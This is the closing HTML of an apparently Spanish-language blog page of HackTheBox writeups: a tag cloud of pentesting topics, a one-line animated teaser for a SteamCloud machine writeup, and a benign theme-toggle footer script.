class="set-1">CronTabs,</a> <a href="/tag/crypto%2C/" class="set-1">Crypto,</a> <a href="/tag/curlftp%2C/" class="set-1">CurlFtp,</a> <a href="/tag/decimal%2C/" class="set-1">Decimal,</a> <a href="/tag/device/" class="set-1">Device</a> <a href="/tag/directory%2C/" class="set-1">Directory,</a> <a href="/tag/dockers%2C/" class="set-1">Dockers,</a> <a href="/tag/domain/" class="set-1">Domain</a> <a href="/tag/dominios%2C/" class="set-1">Dominios,</a> <a href="/tag/dovecot%2C/" class="set-1">Dovecot,</a> <a href="/tag/elastix%2C/" class="set-1">Elastix,</a> <a href="/tag/empezando%2C/" class="set-1">Empezando,</a> <a href="/tag/encrypt-decrypt%2C/" class="set-1">Encrypt-Decrypt,</a> <a href="/tag/enumeracion%2C/" class="set-1">Enumeracion,</a> <a href="/tag/enumeration%2C/" class="set-1">Enumeration,</a> <a href="/tag/ethereum%2C/" class="set-1">Ethereum,</a> <a href="/tag/evil-winrm%2C/" class="set-1">Evil-WinRm,</a> <a href="/tag/excel%2C/" class="set-1">Excel,</a> <a href="/tag/excell/" class="set-1">Excell</a> <a href="/tag/execel/" class="set-1">Execel</a> <a href="/tag/exploit%2C/" class="set-1">Exploit,</a> <a href="/tag/fail2ban%2C/" class="set-1">Fail2ban,</a> <a href="/tag/file/" class="set-1">File</a> <a href="/tag/file%2C/" class="set-1">File,</a> <a href="/tag/files%2C/" class="set-1">Files,</a> <a href="/tag/firefox%2C/" class="set-1">Firefox,</a> <a href="/tag/ftp%2C/" class="set-1">Ftp,</a> <a href="/tag/fueza/" class="set-1">Fueza</a> <a href="/tag/fuzzing/" class="set-1">Fuzzing</a> <a href="/tag/fuzzing%2C/" class="set-1">Fuzzing,</a> <a href="/tag/get-adobject%2C/" class="set-1">Get-ADObject,</a> <a href="/tag/getchanges-all%2C/" class="set-1">GetChanges-All,</a> <a href="/tag/gitlab%2C/" class="set-1">GitLab,</a> <a href="/tag/gitbucket%2C/" class="set-1">Gitbucket,</a> <a href="/tag/gratuitas./" class="set-1">Gratuitas.</a> <a href="/tag/group%2C/" class="set-1">Group,</a> <a href="/tag/groups%2C/" class="set-1">Groups,</a> <a href="/tag/guessing%2C/" class="set-1">Guessing,</a> <a href="/tag/gwolle%2C/" class="set-1">Gwolle,</a> <a href="/tag/htb%2C/" class="set-5">HTB,</a> <a href="/tag/hackthebox%2C/" class="set-1">HackTheBox,</a> <a href="/tag/hacking/" class="set-3">Hacking</a> <a href="/tag/hacking%2C/" class="set-2">Hacking,</a> <a href="/tag/heartbleed%2C/" class="set-1">HeartBleed,</a> <a href="/tag/hex%2C/" class="set-1">Hex,</a> <a href="/tag/hijacking%2C/" class="set-1">Hijacking,</a> <a href="/tag/hydra%2C/" class="set-1">Hydra,</a> <a href="/tag/iis%2C/" class="set-1">IIS,</a> <a href="/tag/iis-6.0%2C/" class="set-1">IIS-6.0,</a> <a href="/tag/ipfs%2C/" class="set-1">IPFS,</a> <a href="/tag/ipv6%2C/" class="set-1">IPV6,</a> <a href="/tag/irc%2C/" class="set-1">IRC,</a> <a href="/tag/id-rsa%2C/" class="set-1">Id-Rsa,</a> <a href="/tag/impackect-secretsdump%2C/" class="set-1">Impackect-SecretsDump,</a> <a href="/tag/import/" class="set-1">Import</a> <a href="/tag/inclusion%2C/" class="set-1">Inclusion,</a> <a href="/tag/injection%29%2C/" class="set-1">Injection),</a> <a href="/tag/injection%2C/" class="set-1">Injection,</a> <a href="/tag/jjs%2C/" class="set-1">JJS,</a> <a href="/tag/jndi%2C/" class="set-1">JNDI,</a> <a href="/tag/joomla%2C/" class="set-1">Joomla,</a> <a href="/tag/journalctl%2C/" class="set-1">Journalctl,</a> <a href="/tag/juicypotato%2C/" class="set-1">JuicyPotato,</a> <a href="/tag/kerberoasting/" class="set-1">Kerberoasting</a> <a href="/tag/kerbrute/" class="set-1">Kerbrute</a> <a href="/tag/kerbrute%2C/" class="set-1">Kerbrute,</a> <a href="/tag/kernel/" class="set-1">Kernel</a> <a href="/tag/knocking%2C/" class="set-1">Knocking,</a> <a href="/tag/kubernetes%2C/" class="set-1">Kubernetes,</a> <a href="/tag/ldap/" class="set-1">LDAP</a> <a href="/tag/ldap%2C/" class="set-1">LDAP,</a> <a href="/tag/lfi%2C/" class="set-1">LFI,</a> <a href="/tag/local/" class="set-1">Local</a> <a href="/tag/log4j%2C/" class="set-1">Log4j,</a> <a href="/tag/mail%2C/" class="set-1">Mail,</a> <a href="/tag/malicius/" class="set-1">Malicius</a> <a href="/tag/maquina/" class="set-1">Maquina</a> <a href="/tag/maquinas/" class="set-5">Maquinas</a> <a href="/tag/mattermost%2C/" class="set-1">Mattermost,</a> <a href="/tag/mimikatz.exe%2C/" class="set-1">Mimikatz.exe,</a> <a href="/tag/misconfigurations%2C/" class="set-1">Misconfigurations,</a> <a href="/tag/mongo-db%2C/" class="set-1">Mongo-db,</a> <a href="/tag/mongodb%2C/" class="set-1">MongoDB,</a> <a href="/tag/mr.robot%2C/" class="set-1">Mr.Robot,</a> <a href="/tag/mssqlclient%2C/" class="set-1">Mssqlclient,</a> <a href="/tag/multiples/" class="set-1">Multiples</a> <a href="/tag/myssql-server%2C/" class="set-1">Myssql-Server,</a> <a href="/tag/neo4j%2C/" class="set-1">Neo4j,</a> <a href="/tag/nibbleblog%2C/" class="set-1">NibbleBlog,</a> <a href="/tag/nishang%2C/" class="set-1">Nishang,</a> <a href="/tag/nosqli%2C/" class="set-1">NoSQLI,</a> <a href="/tag/node-red%2C/" class="set-1">Node-Red,</a> <a href="/tag/nostromo/" class="set-1">Nostromo</a> <a href="/tag/os/" class="set-1">OS</a> <a href="/tag/oscp/" class="set-3">OSCP</a> <a href="/tag/osticket%2C/" class="set-1">OSTicket,</a> <a href="/tag/offensive/" class="set-1">Offensive</a> <a href="/tag/olevba/" class="set-1">Olevba</a> <a href="/tag/php%2C/" class="set-1">PHP,</a> <a href="/tag/php./" class="set-1">PHP.</a> <a href="/tag/password/" class="set-1">Password</a> <a href="/tag/path/" class="set-1">Path</a> <a href="/tag/path%2C/" class="set-3">Path,</a> <a href="/tag/pivoting%2C/" class="set-1">Pivoting,</a> <a href="/tag/plugins%2C/" class="set-1">Plugins,</a> <a href="/tag/pods%2Fcontainer./" class="set-1">Pods/Container.</a> <a href="/tag/popd%2C/" class="set-1">PopD,</a> <a href="/tag/port/" class="set-1">Port</a> <a href="/tag/portknocking%2C/" class="set-1">PortKnocking,</a> <a href="/tag/portainer%2C/" class="set-1">Portainer,</a> <a href="/tag/portal%2C/" class="set-1">Portal,</a> <a href="/tag/post-explotacion./" class="set-1">Post-Explotacion.</a> <a href="/tag/powershell/" class="set-1">PowerShell</a> <a href="/tag/powerup%2C/" class="set-1">PowerUp,</a> <a href="/tag/powershell%2C/" class="set-1">Powershell,</a> <a href="/tag/privesc/" class="set-1">Privesc</a> <a href="/tag/privesc%2C/" class="set-1">Privesc,</a> <a href="/tag/proteccions%2C/" class="set-1">Proteccions,</a> <a href="/tag/protection%2C/" class="set-1">Protection,</a> <a href="/tag/python%2C/" class="set-1">Python,</a> <a href="/tag/python3%2C/" class="set-1">Python3,</a> <a href="/tag/rce%2C/" class="set-1">RCE,</a> <a href="/tag/rdp-file%2C/" class="set-1">RDP-file,</a> <a href="/tag/rpcclient%2C/" class="set-1">RPCCLIENT,</a> <a href="/tag/read%2C/" class="set-1">Read,</a> <a href="/tag/readgmsapassword%2C/" class="set-1">ReadGMSAPassword,</a> <a href="/tag/recycle/" class="set-1">Recycle</a> <a href="/tag/remote/" class="set-1">Remote</a> <a href="/tag/retiradas/" class="set-1">Retiradas</a> <a href="/tag/retiradas%2C/" class="set-5">Retiradas,</a> <a href="/tag/retiradas./" class="set-1">Retiradas.</a> <a href="/tag/revome/" class="set-1">Revome</a> <a href="/tag/smb%2C/" class="set-1">SMB,</a> <a href="/tag/snmp%2C/" class="set-1">SNMP,</a> <a href="/tag/sqli/" class="set-1">SQLI</a> <a href="/tag/sqli%2C/" class="set-1">SQLI,</a> <a href="/tag/sqlinjecction%2C/" class="set-1">SQLInjecction,</a> <a href="/tag/ss%2C/" class="set-1">SS,</a> <a href="/tag/ssh%2C/" class="set-1">SSH,</a> <a href="/tag/ssrf/" class="set-1">SSRF</a> <a href="/tag/ssrf%2C/" class="set-1">SSRF,</a> <a href="/tag/ssti%28server/" class="set-1">SSTI(Server</a> <a href="/tag/suid%2C/" class="set-1">SUID,</a> <a href="/tag/sam%2C/" class="set-1">Sam,</a> <a href="/tag/samba%2C/" class="set-1">Samba,</a> <a href="/tag/scheduler%2C/" class="set-1">Scheduler,</a> <a href="/tag/script%2C/" class="set-1">Script,</a> <a href="/tag/secretsdump.py%2C/" class="set-1">SecretsDump.py,</a> <a href="/tag/secretsdumps.py%2C/" class="set-1">Secretsdumps.py,</a> <a href="/tag/security%2C/" class="set-1">Security,</a> <a href="/tag/shares/" class="set-1">Shares</a> <a href="/tag/sharphound.ps1%2C/" class="set-1">SharpHound.ps1,</a> <a href="/tag/shellshock%2C/" class="set-1">ShellShock,</a> <a href="/tag/side/" class="set-1">Side</a> <a href="/tag/smart/" class="set-1">Smart</a> <a href="/tag/smb%2C/" class="set-1">Smb,</a> <a href="/tag/smbclient%2C/" class="set-1">SmbClient,</a> <a href="/tag/smbmap%2C/" class="set-1">SmbMap,</a> <a href="/tag/sqsh%2C/" class="set-1">Sqsh,</a> <a href="/tag/starting/" class="set-1">Starting</a> <a href="/tag/steganografia%2C/" class="set-1">Steganografia,</a> <a href="/tag/subdomains%2C/" class="set-1">Subdomains,</a> <a href="/tag/sudo/" class="set-1">Sudo</a> <a href="/tag/system%2C/" class="set-1">System,</a> <a href="/tag/thm%2C/" class="set-1">THM,</a> <a href="/tag/template/" class="set-1">Template</a> <a href="/tag/tmux-priv%2C/" class="set-1">Tmux-Priv,</a> <a href="/tag/tomcat/" class="set-1">Tomcat</a> <a href="/tag/tomcat%2C/" class="set-1">Tomcat,</a> <a href="/tag/transfer%2C/" class="set-1">Transfer,</a> <a href="/tag/transferencia/" class="set-1">Transferencia</a> <a href="/tag/tryhackme%2C/" class="set-1">TryHackMe,</a> <a href="/tag/ubuntu/" class="set-1">Ubuntu</a> <a href="/tag/unrealirc%2C/" class="set-1">UnRealIRC,</a> <a href="/tag/upload/" class="set-1">Upload</a> <a href="/tag/userenum%2C/" class="set-1">Userenum,</a> <a href="/tag/vnc/" class="set-1">VNC</a> <a href="/tag/web/" class="set-2">Web</a> <a href="/tag/web3%2C/" class="set-1">Web3,</a> <a href="/tag/webshell%2C/" class="set-1">Webshell,</a> <a href="/tag/wget/" class="set-1">Wget</a> <a href="/tag/winpeas%2C/" class="set-1">WinPeas,</a> <a href="/tag/windows/" class="set-1">Windows</a> <a href="/tag/windows%2C/" class="set-1">Windows,</a> <a href="/tag/wordpress%2C/" class="set-1">Wordpress,</a> <a href="/tag/wpscan%2C/" class="set-1">Wpscan,</a> <a href="/tag/writeup/" class="set-2">Writeup</a> <a href="/tag/writeup%2C/" class="set-3">Writeup,</a> <a href="/tag/x-forwarder-for%2C/" class="set-1">X-Forwarder-For,</a> <a href="/tag/xp_cmdshell%2C/" class="set-1">Xp_CmdShell,</a> <a href="/tag/xp_dirtree%2C/" class="set-1">Xp_dirtree,</a> <a href="/tag/ysoserial%2C/" class="set-1">Ysoserial,</a> <a href="/tag/zona%2C/" class="set-1">Zona,</a> <a href="/tag/zone/" class="set-1">Zone</a> <a href="/tag/app-js%2C/" class="set-1">app-js,</a> <a href="/tag/bashscript%2C/" class="set-1">bashscript,</a> <a href="/tag/chisel%2C/" class="set-1">chisel,</a> <a href="/tag/de/" class="set-1">de</a> <a href="/tag/dompdf%2C/" class="set-1">dompdf,</a> <a href="/tag/ecppt%2C/" class="set-1">eCPPT,</a> <a href="/tag/fcrackzip%2C/" class="set-1">fcrackzip,</a> <a href="/tag/html/" class="set-1">html</a> <a href="/tag/injecction/" class="set-1">injecction</a> <a href="/tag/msfvenom%2C/" class="set-1">msfvenom,</a> <a href="/tag/nmap%2C/" class="set-1">nmap,</a> <a href="/tag/pfsense%2C/" class="set-1">pfSense,</a> <a href="/tag/pfx2john%2C/" class="set-1">pfx2john,</a> <a href="/tag/phpliteadmin%2C/" class="set-1">phpLiteAdmin,</a> <a href="/tag/privesc/" class="set-1">privesc</a> <a href="/tag/privesc%2C/" class="set-1">privesc,</a> <a href="/tag/python%2C/" class="set-1">python,</a> <a href="/tag/redis-cli%2C/" class="set-1">redis-cli,</a> <a href="/tag/rsync%2C/" class="set-1">rsync,</a> <a href="/tag/smtpd%2C/" class="set-1">smtpd,</a> <a href="/tag/socat%2C/" class="set-1">socat,</a> <a href="/tag/squidproxy%2C/" class="set-1">squidproxy,</a> <a href="/tag/steghide%2C/" class="set-1">steghide,</a> <a href="/tag/tar%2C/" class="set-1">tar,</a> <a href="/tag/webdav%2C/" class="set-1">webdav,</a> <a href="/tag/welcome/" class="set-1">welcome</a> <a href="/tag/xss/" class="set-1">xss</a></div>
  




<script>
  let i = 0;
  const text = 'En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada STEAMCLOUD.';
  const speed = parseInt('50');
  
  function typeWriter() {
    if (i < text.length) {
      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
      i++;
      setTimeout(typeWriter, speed);
    }
  }

  document.getElementById('animated-post-description').style.display = 'initial';
  typeWriter();
</script>

      </div>
    </main><footer class="site-footer">
  <div class="wrapper">
    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
    <label for="theme-toggle" class="toggle">
    <span class="toggle__handler">
      <span class="crater crater--1"></span>
      <span class="crater crater--2"></span>
      <span class="crater crater--3"></span>
    </span>
        <span class="star star--1"></span>
        <span class="star star--2"></span>
        <span class="star star--3"></span>
        <span class="star star--4"></span>
        <span class="star star--5"></span>
        <span class="star star--6"></span>
    </label>
</div>
<script type="text/javascript">
const theme = localStorage.getItem('theme');

if (theme === "light") {
    document.documentElement.setAttribute('data-theme', 'light');
} else {
    document.documentElement.setAttribute('data-theme', 'dark');
}
const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');

function activateDarkTheme() {
    document.getElementById('theme-toggle').checked = true;
    document.documentElement.setAttribute('data-theme', 'dark');
    document.documentElement.classList.add('theme--dark');
    document.documentElement.classList.remove('theme--light');
	document.getElementById("theme-toggle").className = 'light';
	window.localStorage.setItem('theme', 'dark');
}

function activateLightTheme() {
    document.getElementById('theme-toggle').checked = false;
    document.documentElement.setAttribute('data-theme', 'light');
    document.documentElement.classList.add('theme--light');
    document.documentElement.classList.remove('theme--dark');
	document.getElementById("theme-toggle").className = 'dark';
	window.localStorage.setItem('theme', 'light');
}

if (theme === "dark") {
    activateDarkTheme();
} else if (theme === "light") {
    activateLightTheme();
} else if  (userPrefers === "light") {
    activateDarkTheme();
} else {
    activateDarkTheme();
}

function modeSwitcher() {
	let currentMode = document.documentElement.getAttribute('data-theme');
	if (currentMode === "dark") {
	    activateLightTheme();
	} else {
	    activateDarkTheme();
	}
}
</script></div>
  </div>
</footer>


<script>
      window.FontAwesomeConfig = {
        searchPseudoElements: true
      }
    </script>
  </body>

</html>
